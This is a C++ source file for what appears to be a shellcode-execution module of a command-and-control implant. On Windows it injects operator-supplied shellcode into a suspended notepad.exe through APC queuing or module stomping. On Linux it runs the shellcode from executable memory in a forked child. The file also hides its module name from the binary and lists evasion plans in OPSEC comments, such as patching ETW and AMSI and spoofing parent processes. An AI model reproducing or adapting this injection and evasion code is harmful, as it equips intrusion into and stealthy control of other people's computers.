#include "AssemblyExec.hpp"

#include <cstring>
#include <sstream>
#include <chrono>
#include <thread>

#include "Common.hpp"
#include "Tools.hpp"

#ifdef __linux__
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sstream>
#include <unistd.h>
#include <fcntl.h>
#elif _WIN32
#include <io.h>
#include <fcntl.h>
#endif

#define BUFSIZE 2048

// Max duration of the shellcode execution befor it's killed
const int maxDurationShellCode=120;

using namespace std;

// Compute hash of moduleName at compile time, so the moduleName string don't show in the binary
constexpr std::string_view moduleName = "assemblyExec";
constexpr unsigned long long moduleHash = djb2(moduleName);


#ifdef _WIN32

__declspec(dllexport) AssemblyExec* A_AssemblyExecConstructor() 
{
    return new AssemblyExec();
}

#else

__attribute__((visibility("default"))) AssemblyExec* AssemblyExecConstructor() 
{
    return new AssemblyExec();
}

#endif

AssemblyExec::AssemblyExec()
#ifdef BUILD_TEAMSERVER
	: ModuleCmd(std::string(moduleName), moduleHash)
#else
	: ModuleCmd("", moduleHash)
#endif
{
}

AssemblyExec::~AssemblyExec()
{
}


// OPSEC remove getHelp and getInfo strings from the beacon compilation
std::string AssemblyExec::getInfo()
{
	std::string info;
#ifdef BUILD_TEAMSERVER
	info += "assemblyExec:\n";
	info += "Execute shellcode in a process (notepad.exe), wait for the end of execution or a timeout (120 sec). Retrieve the output.\n";
	info += "Use -r to use a shellcode file.\n";
	info += "If -e or -d are given, use donut to create the shellcode.\n";
	info += "exemple:\n";
	info += "- assemblyExec -r ./shellcode.bin\n";
	info += "- assemblyExec -e ./program.exe arg1 arg2...\n";
	info += "- assemblyExec -e ./Seatbelt.exe -group=system\n";
	info += "- assemblyExec -d ./test.dll method arg1 arg2...\n";
#endif
	return info;
}

// TODO create a new init with boost arguement parsing if just compiled on teamServerSide
// OPSEC remove init from the beacon compilation
int AssemblyExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
	if (splitedCmd.size() >= 3)
	{
		bool donut=false;
		std::string inputFile=splitedCmd[2];
		std::string method;
		std::string args;
		int pid=-1;

		if(splitedCmd[1]=="-e")
		{
			donut=true;
			for (int idx = 3; idx < splitedCmd.size(); idx++) 
			{
				if(!args.empty())
					args+=" ";
				args+=splitedCmd[idx];
			}
		}
		else if(splitedCmd[1]=="-d")
		{
			donut=true;
			if(splitedCmd.size() > 3)
				method=splitedCmd[3];
			else
			{
				std::string msg = "Method is mandatory for DLL.\n";
				c2Message.set_returnvalue(msg);
				return -1;
			}
			for (int idx = 4; idx < splitedCmd.size(); idx++) 
			{
				if(!args.empty())
					args+=" ";
				args+=splitedCmd[idx];
			}
		}
		else if(splitedCmd[1]=="-r")
		{
		}
		else
		{
			std::string msg = "One of the tags, -r, -e or -d must be provided.\n";
			c2Message.set_returnvalue(msg);
			return -1;
		}

		if(inputFile.empty())
		{
			std::string msg = "A file name have to be provided.\n";
			c2Message.set_returnvalue(msg);
			return -1;
		}

		std::ifstream myfile;
		myfile.open(inputFile, std::ios::binary);

		if(!myfile)
		{
			std::string newInputFile=m_toolsDirectoryPath;
			newInputFile+=inputFile;
			myfile.open(newInputFile, std::ios::binary);
			inputFile=newInputFile;
		}

		if(!myfile) 
		{
			std::string msg = "Couldn't open file.\n";
			c2Message.set_returnvalue(msg);
			return -1;
		}
		myfile.close();

		std::string payload;
		if(donut)
		{
			// if we create a process we need to exite process with donut shellcode
			// Otherwise we exite the thread
			creatShellCodeDonut(inputFile, method, args, payload, true);

			// creatShellCodeDonut(inputFile, method, args, payload, false);
		}
		else
		{
			std::ifstream input(inputFile, std::ios::binary);
			std::string payload_(std::istreambuf_iterator<char>(input), {});
			payload=payload_;
		}

		if(payload.size()==0)
		{
			std::string msg = "Something went wrong. Payload empty.\n";
			c2Message.set_returnvalue(msg);
			return -1;
		}

		std::string cmd;
		for (int idx = 1; idx < splitedCmd.size(); idx++) 
		{
			cmd+=splitedCmd[idx];
			cmd+=" ";
		}

		c2Message.set_pid(pid);
		c2Message.set_cmd(cmd);
		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
		c2Message.set_data(payload.data(), payload.size());
	}
	else
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}
#endif
	return 0;
}


int AssemblyExec::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	const std::string payload = c2Message.data();

	std::string result;

#ifdef __linux__

	if(1)
	{
		pid_t pid = 0;
		int pipefd[2];

		int ret = pipe(pipefd); //create a pipe
		pid = fork(); //spawn a child process
		if (pid == 0)
		{
			// Child. redirect std output to pipe, launch process
			close(pipefd[0]);
			dup2(pipefd[1], STDOUT_FILENO);

			void *page = mmap(NULL, payload.size(), PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
			memcpy(page, payload.data(), payload.size());
			mprotect(page, payload.size(), PROT_READ|PROT_EXEC);
			((void(*)())page)();
			exit(0);
		}

		pid_t child_process_pid = pid;
		int child_process_output_fd = pipefd[0];

		//Only parent gets here. make tail nonblocking.
		close(pipefd[1]);
		fcntl(pipefd[0], F_SETFL, fcntl(pipefd[0], F_GETFL) | O_NONBLOCK);

		std::chrono::steady_clock::time_point begin = std::chrono::steady_clock::now();
		while(1)
		{
			int status;
			pid_t endID=waitpid(child_process_pid, &status, WNOHANG);
			if (endID == -1)           
				break;
			else if (endID == 0) 
			{ 
				std::chrono::steady_clock::time_point now = std::chrono::steady_clock::now();
				auto elapse = std::chrono::duration_cast<std::chrono::seconds>(now - begin).count();
				if(elapse>=maxDurationShellCode)
				{
					kill(pid, SIGKILL);
					break;
				}
				else
					sleep(1);
			}
		}

		char buf[1000];
		int nbBytes=1;
		while(nbBytes)
		{
			nbBytes = read(child_process_output_fd, buf, 1000);
			if(nbBytes)
				result+=buf;
		}
	}

	if(0)
	{
		// inject in an other thread -> work but i cannot get the output
		streambuf* oldCoutStreamBuf = cout.rdbuf();
		ostringstream strCout;
		cout.rdbuf( strCout.rdbuf() );
		
		std::thread t1(execShellCode, payload);
		if(t1.joinable())
			t1.join();

		cout.rdbuf( oldCoutStreamBuf );
		cout << strCout.str();
	}

	if(0)
	{
		// inject here  -> work but terminate the process
		void *page = mmap(NULL, payload.size(), PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
		memcpy(page, payload.data(), payload.size());
		mprotect(page, payload.size(), PROT_READ|PROT_EXEC);
		((void(*)())page)();
	}

#elif _WIN32

	bool isInjectIntoNewProcess=true;
	std::string processToSpawn="notepad.exe";

	// if we create a process we need to exite process with donut shellcode
	if(isInjectIntoNewProcess)
		createNewProcess(payload, processToSpawn, result);

	// Otherwise we exite the thread
	else
		createNewThread(payload, result);

#endif

	c2RetMessage.set_instruction(c2RetMessage.instruction());
	c2RetMessage.set_cmd(c2Message.cmd());
	c2RetMessage.set_returnvalue(result);
	
	return 0;
}

#ifdef _WIN32


// Create new thread to run the shellcode, the memory use to inject the payload is taken from a DLL (Module Stomping)
// loaded specialy for this purpose. It avoid to use VirtualAlloc.
int AssemblyExec::createNewThread(const std::string& payload, std::string& result)
{
	StdCapture stdCapture;
	stdCapture.BeginCapture();

	// Module stomping
	unsigned char sLib[] = "HologramWorld.dll";
	HMODULE hVictimLib = LoadLibrary((LPCSTR) sLib);
	char * ptr = (char *) hVictimLib + 2*4096 + 12;

	// Alloc memory
	// char * ptr = (char *) VirtualAlloc(NULL, payload.size()+4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	DWORD oldprotect = 0;
	VirtualProtect((char *) ptr, payload.size() + 4096, PAGE_READWRITE, &oldprotect);
	RtlMoveMemory(ptr, (void *)payload.data(), payload.size());
	VirtualProtect((char *) ptr, payload.size() + 4096, oldprotect, &oldprotect);
	HANDLE thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) ptr, NULL, 0, 0);

	WaitForSingleObject(thread, maxDurationShellCode*1000);

	stdCapture.EndCapture();
	result+=stdCapture.GetCapture();

	return 0;
}

// OPSEC use syscall for injection
// OPSEC patch etw et amsi
// OPSEC choose the process as an argument
// OPSEC in CS the sacrificial process communicate with PIPE, name or anonymous like here ?
// OPSEC parent process spoofing
// OPSEC wipe memory of the shellcode in the remote process at the end

// Create a new process in suspended mode to run the shellcode.
int AssemblyExec::createNewProcess(const std::string& payload, const std::string& processToSpawn, std::string& result)
{
	HANDLE g_hChildStd_OUT_Rd = NULL;
	HANDLE g_hChildStd_OUT_Wr = NULL;
	HANDLE g_hChildStd_ERR_Rd = NULL;
	HANDLE g_hChildStd_ERR_Wr = NULL;

	SECURITY_ATTRIBUTES sa; 
    // Set the bInheritHandle flag so pipe handles are inherited. 
    sa.nLength = sizeof(SECURITY_ATTRIBUTES); 
    sa.bInheritHandle = TRUE; 
    sa.lpSecurityDescriptor = NULL; 
    // Create a pipe for the child process's STDERR. 
    if ( ! CreatePipe(&g_hChildStd_ERR_Rd, &g_hChildStd_ERR_Wr, &sa, 0) ) 
	{
        return -1;
    }
    // Ensure the read handle to the pipe for STDERR is not inherited.
    if ( ! SetHandleInformation(g_hChildStd_ERR_Rd, HANDLE_FLAG_INHERIT, 0) )
	{
       	return -1;
    }
    // Create a pipe for the child process's STDOUT. 
    if ( ! CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &sa, 0) ) 
	{
        return -1;
    }
    // Ensure the read handle to the pipe for STDOUT is not inherited
    if ( ! SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0) )
	{
        return -1;
    }
    // Create the child process. 
    PROCESS_INFORMATION piProcInfo; 
    STARTUPINFO siStartInfo;
    bool bSuccess = FALSE; 

    // Set up members of the PROCESS_INFORMATION structure. 
    ZeroMemory( &piProcInfo, sizeof(PROCESS_INFORMATION) );

    // Set up members of the STARTUPINFO structure. 
    // This structure specifies the STDERR and STDOUT handles for redirection.
    ZeroMemory( &siStartInfo, sizeof(STARTUPINFO) );
    siStartInfo.cb = sizeof(STARTUPINFO); 
    siStartInfo.hStdError = g_hChildStd_ERR_Wr;
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    // Create the child process. 
	bSuccess = CreateProcess(NULL, const_cast<LPSTR>(processToSpawn.c_str()), NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &siStartInfo, &piProcInfo);
    CloseHandle(g_hChildStd_ERR_Wr);
    CloseHandle(g_hChildStd_OUT_Wr);

    // If an error occurs, exit the application. 
    if ( ! bSuccess ) 
	{
		result += "Error: Process failed to start.\n";
		return -1;
    }

	PVOID remoteBuffer = VirtualAllocEx(piProcInfo.hProcess, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	WriteProcessMemory(piProcInfo.hProcess, remoteBuffer, payload.data(), payload.size(), NULL);
	DWORD oldprotect = 0;
	VirtualProtectEx(piProcInfo.hProcess, remoteBuffer, payload.size(), PAGE_EXECUTE_READ, &oldprotect);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remoteBuffer;
	QueueUserAPC((PAPCFUNC)apcRoutine, piProcInfo.hThread, NULL);
	ResumeThread(piProcInfo.hThread);

	m_isProcessRuning=true;
	m_processHandle = piProcInfo.hProcess;
	std::thread thread([this] { killProcess(); });

	DWORD dwRead; 
    CHAR chBuf[BUFSIZE];
    bSuccess = FALSE;
    std::string out = "";
	std::string err = "";
    for (;;) { 
        bSuccess=ReadFile( g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
        if( ! bSuccess || dwRead == 0 ) break; 

        std::string s(chBuf, dwRead);
        out += s;
    } 
    dwRead = 0;
    for (;;) { 
        bSuccess=ReadFile( g_hChildStd_ERR_Rd, chBuf, BUFSIZE, &dwRead, NULL);
        if( ! bSuccess || dwRead == 0 ) break; 

        std::string s(chBuf, dwRead);
        err += s;

    } 
	m_isProcessRuning = false;
	CloseHandle(g_hChildStd_ERR_Rd);
    CloseHandle(g_hChildStd_OUT_Rd);
  	
	thread.join();

	result += "Stdout:\n";
	result += out;
	result += "\n";
	if(!err.empty())
	{
		result += "Stderr:\n";
		result += err;
		result += "\n";
	}

	CloseHandle(piProcInfo.hProcess);
	CloseHandle(piProcInfo.hThread);

	return 0;
}


int AssemblyExec::killProcess()
{
	std::chrono::steady_clock::time_point begin = std::chrono::steady_clock::now();
	while (1)
	{
		if (!m_isProcessRuning) 
			break;

		std::chrono::steady_clock::time_point now = std::chrono::steady_clock::now();
		auto elapse = std::chrono::duration_cast<std::chrono::seconds>(now - begin).count();
		if(elapse>=maxDurationShellCode)
		{
			TerminateProcess(m_processHandle, 0);
			break;
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(100));
	}

	return 0;
}

#endif